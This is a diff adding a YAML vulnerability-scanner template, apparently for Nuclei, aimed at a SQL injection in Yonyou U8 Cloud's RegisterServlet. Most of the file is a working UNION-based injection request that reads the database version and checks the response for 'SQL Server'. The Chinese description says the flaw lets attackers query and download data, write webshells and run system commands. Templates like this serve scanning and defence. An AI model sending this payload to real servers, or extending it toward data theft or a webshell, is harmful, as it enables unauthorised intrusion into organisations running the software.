@@ -1,0 +1,28 @@
+id: yongyou-nc-RegisterServlet-sqli
+info:
+  name: yongyou-nc-RegisterServlet-sqli
+  author: apple
+  severity: high
+  description: 用友U8 Cloud nc.bs.sm.login2.RegisterServlet SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        X-Forwarded-For: 127.0.0.1
+        Cookie: JSESSIONID=CE822C09F5A178B38518749589D32440.server
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'SQL Server'
